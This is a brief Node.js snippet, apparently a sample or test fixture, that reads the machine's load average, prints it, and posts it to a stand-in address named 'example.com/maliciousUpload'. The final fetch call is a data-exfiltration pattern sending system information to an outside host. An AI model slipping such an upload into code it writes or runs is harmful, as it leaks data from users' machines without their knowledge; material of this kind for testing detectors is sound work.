const os = require('os')

const loadavg = os.loadavg()
console.log('Loadavg:', loadavg)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { loadavg }
  }
)
